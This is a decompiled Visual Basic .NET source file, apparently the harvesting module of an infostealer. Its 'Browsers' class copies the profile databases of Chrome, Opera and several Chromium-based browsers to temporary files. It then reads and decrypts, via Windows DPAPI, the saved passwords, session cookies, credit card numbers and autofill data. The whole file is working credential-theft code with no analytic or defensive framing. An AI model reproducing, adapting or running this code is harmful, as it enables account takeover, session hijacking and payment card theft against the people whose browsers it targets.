Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Main.Tools
	' Token: 0x0200000E RID: 14
	Friend Class Browsers
		' Token: 0x06000044 RID: 68 RVA: 0x0000583C File Offset: 0x00003A3C
		Public Shared Function GetCards() As List(Of CardData)
			Dim list As List(Of CardData) = New List(Of CardData)()
			Dim environmentVariable As String = Environment.GetEnvironmentVariable("LocalAppData")
			Dim array As String() = New String() { environmentVariable + "\Google\Chrome\User Data\Default\Web Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Opera Software\Opera Stable\Login Data", environmentVariable + "\Kometa\User Data\Default\Web Data", environmentVariable + "\Orbitum\User Data\Default\Web Data", environmentVariable + "\Comodo\Dragon\User Data\Default\Web Data", environmentVariable + "\Amigo\User\User Data\Default\Web Data", environmentVariable + "\Torch\User Data\Default\Web Data" }
			For Each text As String In array
				Dim list2 As List(Of CardData) = Browsers.FetchCards(text)
				If list2 IsNot Nothing Then
					list.AddRange(list2)
				End If
			Next
			Return list
		End Function

		' Token: 0x06000045 RID: 69 RVA: 0x00005900 File Offset: 0x00003B00
		Public Shared Function GetForms() As List(Of FormData)
			Dim list As List(Of FormData) = New List(Of FormData)()
			Dim environmentVariable As String = Environment.GetEnvironmentVariable("LocalAppData")
			Dim array As String() = New String() { environmentVariable + "\Google\Chrome\User Data\Default\Web Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Opera Software\Opera Stable\Login Data", environmentVariable + "\Kometa\User Data\Default\Web Data", environmentVariable + "\Orbitum\User Data\Default\Web Data", environmentVariable + "\Comodo\Dragon\User Data\Default\Web Data", environmentVariable + "\Amigo\User\User Data\Default\Web Data", environmentVariable + "\Torch\User Data\Default\Web Data" }
			For Each text As String In array
				Dim list2 As List(Of FormData) = Browsers.FetchForms(text)
				If list2 IsNot Nothing Then
					list.AddRange(list2)
				End If
			Next
			Return list
		End Function

		' Token: 0x06000046 RID: 70 RVA: 0x000059C4 File Offset: 0x00003BC4
		Public Shared Function GetPasswords() As List(Of PassData)
			Dim list As List(Of PassData) = New List(Of PassData)()
			Dim environmentVariable As String = Environment.GetEnvironmentVariable("LocalAppData")
			Dim array As String() = New String() { environmentVariable + "\Google\Chrome\User Data\Default\Login Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Opera Software\Opera Stable\Login Data", environmentVariable + "\Kometa\User Data\Default\Login Data", environmentVariable + "\Orbitum\User Data\Default\Login Data", environmentVariable + "\Comodo\Dragon\User Data\Default\Login Data", environmentVariable + "\Amigo\User\User Data\Default\Login Data", environmentVariable + "\Torch\User Data\Default\Login Data" }
			For Each text As String In array
				Dim list2 As List(Of PassData) = Browsers.FetchPasswords(text)
				If list2 IsNot Nothing Then
					list.AddRange(list2)
				End If
			Next
			Return list
		End Function

		' Token: 0x06000047 RID: 71 RVA: 0x00005A88 File Offset: 0x00003C88
		Public Shared Function GetCookies() As List(Of CookieData)
			Dim list As List(Of CookieData) = New List(Of CookieData)()
			Dim environmentVariable As String = Environment.GetEnvironmentVariable("LocalAppData")
			Dim array As String() = New String() { environmentVariable + "\Google\Chrome\User Data\Default\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Opera Software\Opera Stable\Cookies", environmentVariable + "\Kometa\User Data\Default\Cookies", environmentVariable + "\Orbitum\User Data\Default\Cookies", environmentVariable + "\Comodo\Dragon\User Data\Default\Cookies", environmentVariable + "\Amigo\User\User Data\Default\Cookies", environmentVariable + "\Torch\User Data\Default\Cookies" }
			For Each text As String In array
				Dim list2 As List(Of CookieData) = Browsers.FetchCookies(text)
				If list2 IsNot Nothing Then
					list.AddRange(list2)
				End If
			Next
			Return list
		End Function

		' Token: 0x06000048 RID: 72
		Private Declare Auto Function CryptUnprotectData Lib "crypt32.dll" (ByRef pCipherText As Browsers.DataBlob, ByRef pszDescription As String, ByRef pEntropy As Browsers.DataBlob, pReserved As IntPtr, ByRef pPrompt As Browsers.CryptprotectPromptstruct, dwFlags As Integer, ByRef pPlainText As Browsers.DataBlob) As Boolean

		' Token: 0x06000049 RID: 73 RVA: 0x00005B4C File Offset: 0x00003D4C
		Public Shared Function DecryptBrowsers(cipherTextBytes As Byte(), Optional entropyBytes As Byte() = Nothing) As Byte()
			Dim dataBlob As Browsers.DataBlob = Nothing
			Dim dataBlob2 As Browsers.DataBlob = Nothing
			Dim dataBlob3 As Browsers.DataBlob = Nothing
			Dim cryptprotectPromptstruct As Browsers.CryptprotectPromptstruct = New Browsers.CryptprotectPromptstruct() With { .cbSize = Marshal.SizeOf(GetType(Browsers.CryptprotectPromptstruct)), .dwPromptFlags = 0, .hwndApp = IntPtr.Zero, .szPrompt = Nothing }
			Dim empty As String = String.Empty
			Try
				Try
					If cipherTextBytes Is Nothing Then
						cipherTextBytes = New Byte(-1) {}
					End If
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length)
					dataBlob2.cbData = cipherTextBytes.Length
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length)
				Catch ex As Exception
				End Try
				Try
					If entropyBytes Is Nothing Then
						entropyBytes = New Byte(-1) {}
					End If
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length)
					dataBlob3.cbData = entropyBytes.Length
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length)
				Catch ex2 As Exception
				End Try
				Browsers.CryptUnprotectData(dataBlob2, empty, dataBlob3, IntPtr.Zero, cryptprotectPromptstruct, 1, dataBlob)
				Dim array As Byte() = New Byte(dataBlob.cbData - 1) {}
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData)
				Return array
			Catch ex3 As Exception
			Finally
				If dataBlob.pbData <> IntPtr.Zero Then
					Marshal.FreeHGlobal(dataBlob.pbData)
				End If
				If dataBlob2.pbData <> IntPtr.Zero Then
					Marshal.FreeHGlobal(dataBlob2.pbData)
				End If
				If dataBlob3.pbData <> IntPtr.Zero Then
					Marshal.FreeHGlobal(dataBlob3.pbData)
				End If
			End Try
			Return New Byte(-1) {}
		End Function

		' Token: 0x0600004A RID: 74 RVA: 0x00005D08 File Offset: 0x00003F08
		Private Shared Function FetchPasswords(basePath As String) As List(Of PassData)
			Dim list As List(Of PassData)
			If Not File.Exists(basePath) Then
				list = Nothing
			Else
				Dim text As String = ""
				If basePath.Contains("Chrome") Then
					text = "Google Chrome"
				End If
				If basePath.Contains("Yandex") Then
					text = "Yandex Browser"
				End If
				If basePath.Contains("Orbitum") Then
					text = "Orbitum Browser"
				End If
				If basePath.Contains("Opera") Then
					text = "Opera Browser"
				End If
				If basePath.Contains("Amigo") Then
					text = "Amigo Browser"
				End If
				If basePath.Contains("Torch") Then
					text = "Torch Browser"
				End If
				If basePath.Contains("Comodo") Then
					text = "Comodo Browser"
				End If
				Try
					Dim text2 As String = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv"
					If File.Exists(text2) Then
						File.Delete(text2)
					End If
					File.Copy(basePath, text2, True)
					Dim sqlHandler As SqlHandler = New SqlHandler(text2)
					Dim list2 As List(Of PassData) = New List(Of PassData)()
					sqlHandler.ReadTable("logins")
					For i As Integer = 0 To sqlHandler.GetRowCount() - 1
						Try
							Dim text3 As String = String.Empty
							Try
								text3 = Encoding.UTF8.GetString(Browsers.DecryptBrowsers(Encoding.[Default].GetBytes(sqlHandler.GetValue(i, 5)), Nothing))
							Catch ex As Exception
							End Try
							If text3 <> "" Then
								list2.Add(New PassData() With { .Url = sqlHandler.GetValue(i, 1).Replace("https://", "").Replace("http://", ""), .Login = sqlHandler.GetValue(i, 3), .Password = text3, .Program = text })
							End If
						Catch ex2 As Exception
						End Try
					Next
					File.Delete(text2)
					list = list2
				Catch ex3 As Exception
					list = Nothing
				End Try
			End If
			Return list
		End Function

		' Token: 0x0600004B RID: 75 RVA: 0x00005F20 File Offset: 0x00004120
		Private Shared Function FetchCookies(basePath As String) As List(Of CookieData)
			Dim list As List(Of CookieData)
			If Not File.Exists(basePath) Then
				list = Nothing
			Else
				Try
					Dim text As String = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv"
					If File.Exists(text) Then
						File.Delete(text)
					End If
					File.Copy(basePath, text, True)
					Dim sqlHandler As SqlHandler = New SqlHandler(text)
					Dim list2 As List(Of CookieData) = New List(Of CookieData)()
					sqlHandler.ReadTable("cookies")
					For i As Integer = 0 To sqlHandler.GetRowCount() - 1
						Try
							Dim text2 As String = String.Empty
							Try
								text2 = Encoding.UTF8.GetString(Browsers.DecryptBrowsers(Encoding.[Default].GetBytes(sqlHandler.GetValue(i, 12)), Nothing))
							Catch ex As Exception
							End Try
							If text2 <> "" Then
								list2.Add(New CookieData() With { .host_key = sqlHandler.GetValue(i, 1), .name = sqlHandler.GetValue(i, 2), .path = sqlHandler.GetValue(i, 4), .expires_utc = sqlHandler.GetValue(i, 5), .secure = sqlHandler.GetValue(i, 6), .value = text2 })
							End If
						Catch ex2 As Exception
						End Try
					Next
					File.Delete(text)
					list = list2
				Catch ex3 As Exception
					list = Nothing
				End Try
			End If
			Return list
		End Function

		' Token: 0x0600004C RID: 76 RVA: 0x000060AC File Offset: 0x000042AC
		Private Shared Function FetchCards(basePath As String) As List(Of CardData)
			Dim list As List(Of CardData)
			If Not File.Exists(basePath) Then
				list = Nothing
			Else
				Try
					Dim text As String = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv"
					If File.Exists(text) Then
						File.Delete(text)
					End If
					File.Copy(basePath, text, True)
					Dim sqlHandler As SqlHandler = New SqlHandler(text)
					Dim list2 As List(Of CardData) = New List(Of CardData)()
					sqlHandler.ReadTable("credit_cards")
					For i As Integer = 0 To sqlHandler.GetRowCount() - 1
						Try
							Dim text2 As String = String.Empty
							Try
								text2 = Encoding.UTF8.GetString(Browsers.DecryptBrowsers(Encoding.[Default].GetBytes(sqlHandler.GetValue(i, 4)), Nothing))
							Catch ex As Exception
							End Try
							If text2 <> "" Then
								list2.Add(New CardData() With { .Name = sqlHandler.GetValue(i, 1), .Exp_m = sqlHandler.GetValue(i, 2), .Exp_y = sqlHandler.GetValue(i, 3), .Number = text2, .Billing = sqlHandler.GetValue(i, 9) })
							End If
						Catch ex2 As Exception
						End Try
					Next
					File.Delete(text)
					list = list2
				Catch ex3 As Exception
					list = Nothing
				End Try
			End If
			Return list
		End Function

		' Token: 0x0600004D RID: 77 RVA: 0x00006228 File Offset: 0x00004428
		Private Shared Function FetchForms(basePath As String) As List(Of FormData)
			Dim list As List(Of FormData)
			If Not File.Exists(basePath) Then
				list = Nothing
			Else
				Try
					Dim text As String = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv"
					If File.Exists(text) Then
						File.Delete(text)
					End If
					File.Copy(basePath, text, True)
					Dim sqlHandler As SqlHandler = New SqlHandler(text)
					Dim list2 As List(Of FormData) = New List(Of FormData)()
					sqlHandler.ReadTable("autofill")
					If sqlHandler.GetRowCount() = 65536 Then
						list = Nothing
					Else
						For i As Integer = 0 To sqlHandler.GetRowCount() - 1
							Try
								list2.Add(New FormData() With { .Name = sqlHandler.GetValue(i, 0), .Value = sqlHandler.GetValue(i, 1) })
							Catch ex As Exception
							End Try
						Next
						File.Delete(text)
						list = list2
					End If
				Catch ex2 As Exception
					list = Nothing
				End Try
			End If
			Return list
		End Function

		' Token: 0x0200000F RID: 15
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure CryptprotectPromptstruct
			' Token: 0x04000083 RID: 131
			Public cbSize As Integer

			' Token: 0x04000084 RID: 132
			Public dwPromptFlags As Integer

			' Token: 0x04000085 RID: 133
			Public hwndApp As IntPtr

			' Token: 0x04000086 RID: 134
			Public szPrompt As String
		End Structure

		' Token: 0x02000010 RID: 16
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure DataBlob
			' Token: 0x04000087 RID: 135
			Public cbData As Integer

			' Token: 0x04000088 RID: 136
			Public pbData As IntPtr
		End Structure
	End Class
End Namespace
